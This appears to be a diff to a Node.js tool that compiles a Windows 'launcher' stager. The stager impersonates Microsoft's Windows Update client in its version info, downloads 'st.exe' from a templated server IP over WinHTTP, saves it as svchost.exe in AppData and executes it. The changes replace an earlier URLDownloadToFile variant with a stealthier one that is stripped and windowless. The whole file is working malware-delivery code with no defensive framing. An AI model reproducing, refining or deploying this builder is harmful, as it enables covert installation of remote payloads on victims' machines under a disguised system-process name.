@@ -4,11 +4,9 @@ import path from 'node:path';
 import os from 'node:os';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
-import { fileURLToPath } from 'node:url'; // <-- Added this
+import { fileURLToPath } from 'node:url';
 
 const execFileP = promisify(execFile);
-
-// FIXED: Define __dirname for ES Modules
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
@@ -30,11 +28,11 @@ BEGIN
         BLOCK "040904b0"
         BEGIN
             VALUE "CompanyName",      "Microsoft Corporation"
-            VALUE "FileDescription",  "Windows Installer"
-            VALUE "FileVersion",      "1.0.0.0"
-            VALUE "InternalName",     "msiexec"
-            VALUE "OriginalFilename", "msiexec.exe"
-            VALUE "ProductName",      "Windows Installer"
+            VALUE "FileDescription",  "Windows Update Setup"
+            VALUE "FileVersion",      "10.0.19041.1"
+            VALUE "InternalName",     "wuauclt"
+            VALUE "OriginalFilename", "wuauclt.exe"
+            VALUE "ProductName",      "Microsoft Windows"
         END
     END
 END
@@ -44,22 +42,83 @@ END
 function cSource({ ip }) {
   return `
 #include <windows.h>
-#include <urlmon.h>
+#include <winhttp.h>
+#include <shlobj.h>
 #include <stdio.h>
+
+#pragma comment(lib, "winhttp.lib")
+
+void download_file(const wchar_t* url, const wchar_t* dest) {
+    URL_COMPONENTS uc = {0};
+    uc.dwStructSize = sizeof(uc);
+    wchar_t host[256] = {0};
+    wchar_t path[1024] = {0};
+    uc.lpszHostName = host;
+    uc.dwHostNameLength = 256;
+    uc.lpszUrlPath = path;
+    uc.dwUrlPathLength = 1024;
+
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
+
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+
+    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
+        WinHttpReceiveResponse(hRequest, NULL)) {
+        
+        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD dwSize = 0;
+            DWORD dwDownloaded = 0;
+            do {
+                dwSize = 0;
+                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+                if (dwSize == 0) break;
+                
+                BYTE* pBuffer = (BYTE*)malloc(dwSize);
+                if (!pBuffer) break;
+                
+                if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
+                    DWORD written;
+                    WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
+                }
+                free(pBuffer);
+            } while (dwSize > 0);
+            CloseHandle(hFile);
+        }
+    }
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    char tempPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, tempPath);
-    char exePath[MAX_PATH];
-    _snprintf(exePath, MAX_PATH, "%ssvchost_%08x.exe", tempPath, GetTickCount());
+    wchar_t appdata[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
 
-    const char* url = "http://${ip}/api/downloads/st.exe";
+    wchar_t dest[MAX_PATH];
+    _snwprintf(dest, MAX_PATH, L"%ls\\\\svchost.exe", appdata);
+
+    const wchar_t* url = L"http://${ip}/api/downloads/st.exe";
     
-    HRESULT hr = URLDownloadToFileA(NULL, url, exePath, 0, NULL);
-    if (SUCCEEDED(hr)) {
-        ShellExecuteA(NULL, "open", exePath, NULL, NULL, SW_HIDE);
+    download_file(url, dest);
+
+    STARTUPINFOW si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+    
+    if (CreateProcessW(dest, NULL, NULL, NULL, FALSE, 0, NULL, appdata, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
 
     return 0;
@@ -80,7 +139,6 @@ export async function compileLauncher({ key, config, baseExe }) {
   fs.writeFileSync(cPath, cSource({ ip }));
   fs.writeFileSync(rcPath, rcSource());
 
-  // Use the fixed __dirname here
   const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
   if (fs.existsSync(iconSourcePath)) {
     fs.copyFileSync(iconSourcePath, path.join(workDir, 'icon.ico'));
@@ -96,7 +154,7 @@ export async function compileLauncher({ key, config, baseExe }) {
 
     await execFileP(CC, [
       '-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
-      '-lurlmon', '-lshell32', '-luser32', '-lkernel32'
+      '-lwinhttp', '-lshell32', '-lole32', '-luser32', '-lkernel32'
     ], { cwd: workDir, timeout: 60_000 });
 
     return fs.readFileSync(outPath);
